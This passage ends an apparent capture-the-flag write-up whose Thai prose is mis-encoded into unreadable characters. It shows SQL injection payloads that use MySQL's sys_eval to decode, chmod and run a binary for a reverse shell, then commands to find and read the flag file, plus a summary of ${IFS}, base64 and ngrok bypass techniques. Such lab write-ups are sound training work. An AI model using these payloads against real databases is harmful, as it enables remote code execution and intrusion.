    1' AND ''=(select sys_eval('cat${IFS}a|base64${IFS}-d${IFS}>b'))#
    ```

- ‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡∏Ç‡∏≠‡∏á‡πÑ‡∏ü‡∏•‡πå `b` ‡πÉ‡∏´‡πâ execute ‡πÑ‡∏î‡πâ
    ```bash
    1' AND ''=(select sys_eval('chmod${IFS}+x${IFS}b'))#
    ```
- ‡πÅ‡∏•‡∏∞‡∏™‡∏∏‡∏î‡∏ó‡πâ‡∏≤‡∏¢‡∏™‡∏±‡πà‡∏á `execute` ‡πÑ‡∏ü‡∏•‡πå `b` ‡πÄ‡∏•‡∏¢
    ```bash
    1' AND ''=(select sys_eval('./b'))#
    ```
‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à reverse shell ‡πÑ‡∏î‡πâ‡πÅ‡∏•‡πâ‡∏ß ‡∏ó‡∏µ‡πà‡πÄ‡∏´‡∏•‡∏∑‡∏≠‡∏Å‡πá‡∏´‡∏≤‡πÑ‡∏ü‡∏•‡πå flag 

### Success! üéâ
<img src="./resources/59.png" alt="" style="width:90% !important;">

‡πÑ‡∏î‡πâ reverse shell ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡πÅ‡∏•‡∏∞‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏•‡πâ‡∏ß‡∏á‡∏´‡∏≤‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•:

**Find Flag:**
   ```bash
   find / -name "flag*" 2>/dev/null
   ```

‡∏û‡∏ö flag ‡πÉ‡∏ô `/var/www/`:

**‡πÅ‡∏•‡∏∞‡∏≠‡πà‡∏≤‡∏ô Flag:**
   ```bash
   cat /var/www/flag_xxx.txt
   ```
<img src="./resources/60.png" alt="" style="width:80% !important;">
<img src="./resources/61.png" alt="" style="width:80% !important;">
<img src="./resources/62.png" alt="" style="width:80% !important;">

### ‚úÖ ‡∏ö‡∏ó‡∏™‡∏£‡∏∏‡∏õ‡∏à‡∏≤‡∏Å‡πÇ‡∏à‡∏ó‡∏¢‡πå‡∏ô‡∏µ‡πâ

1. SQL Injection: ‡πÄ‡∏°‡∏∑‡πà‡∏≠ UNION-based ‡πÉ‡∏ä‡πâ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ ‡∏ï‡πâ‡∏≠‡∏á‡∏û‡∏•‡∏¥‡∏Å‡πÑ‡∏õ‡πÉ‡∏ä‡πâ Blind SQL Injection ‡∏û‡∏£‡πâ‡∏≠‡∏°‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ substr() ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡∏•‡∏∞‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£‡πÅ‡∏ö‡∏ö‡πÄ‡∏ô‡∏µ‡∏¢‡∏ô‡πÜ üïµÔ∏è‚Äç‚ôÇÔ∏è

2. ‡πÄ‡∏à‡∏≤‡∏∞ MySQL: ‡πÄ‡∏£‡∏µ‡∏¢‡∏ô‡∏£‡∏π‡πâ‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ UDF ‡∏ä‡πà‡∏ß‡∏¢‡∏£‡∏±‡∏ô‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á, ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ MySQL, ‡πÅ‡∏•‡∏∞‡πÉ‡∏ä‡πâ plugins ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏ó‡∏≥ command execution ‡∏ó‡∏µ‡πà‡πÅ‡∏≠‡∏ö‡∏ã‡πà‡∏≠‡∏ô‡πÑ‡∏ß‡πâ üîç

3. ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ Bypass: ‡πÉ‡∏ä‡πâ ${IFS} ‡πÅ‡∏ó‡∏ô‡∏ä‡πà‡∏≠‡∏á‡∏ß‡πà‡∏≤‡∏á‡πÉ‡∏ô‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á, base64 ‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡∏´‡∏±‡∏™‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏µ‡∏Å‡πÄ‡∏•‡∏µ‡πà‡∏¢‡∏á‡∏ï‡∏±‡∏ß‡∏•‡∏∞‡∏Ñ‡∏£‡∏≠‡∏±‡∏ô‡∏ï‡∏£‡∏≤‡∏¢, ‡πÅ‡∏•‡∏∞‡∏ï‡∏±‡∏î payload ‡πÄ‡∏õ‡πá‡∏ô‡∏™‡πà‡∏ß‡∏ô‡πÜ ‡πÉ‡∏´‡πâ‡∏ú‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏Ñ‡∏ß‡∏≤‡∏°‡∏¢‡∏≤‡∏ß ‚úÇÔ∏è

4. Reverse Shell: ‡πÉ‡∏ä‡πâ command injection ‡∏™‡∏£‡πâ‡∏≤‡∏á reverse shell, ngrok ‡∏ó‡∏≥ TCP tunneling ‡∏™‡∏∞‡∏î‡∏ß‡∏Å‡πÜ üíª

‡∏Å‡∏≤‡∏£‡πÅ‡∏Å‡πâ‡πÇ‡∏à‡∏ó‡∏¢‡πå‡∏ô‡∏µ‡πâ‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏á‡πà‡∏≤‡∏¢ ‡∏´‡∏±‡∏ß‡πÉ‡∏à‡πÅ‡∏ó‡∏ö‡∏ß‡∏≤‡∏¢‡∏Å‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ó‡πâ‡∏≤‡∏ó‡∏≤‡∏¢‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á‡πÄ‡∏à‡∏≠ ‡∏ó‡∏∏‡∏Å‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏Ñ‡∏∑‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ï‡∏∑‡πà‡∏ô‡πÄ‡∏ï‡πâ‡∏ô‡∏à‡∏ô‡πÑ‡∏°‡πà‡∏£‡∏π‡πâ‡∏à‡∏∞‡∏ö‡∏£‡∏£‡∏¢‡∏≤‡∏¢‡∏¢‡∏±‡∏á‡πÑ‡∏á!

---
###### Written by Kornpong.m
###### #SECPlayground   #SECPlaygroundBloodyXMas2024 

<a href="./"><<‡∏Å‡∏•‡∏±‡∏ö‡∏´‡∏ô‡πâ‡∏≤‡∏´‡∏•‡∏±‡∏Å</a>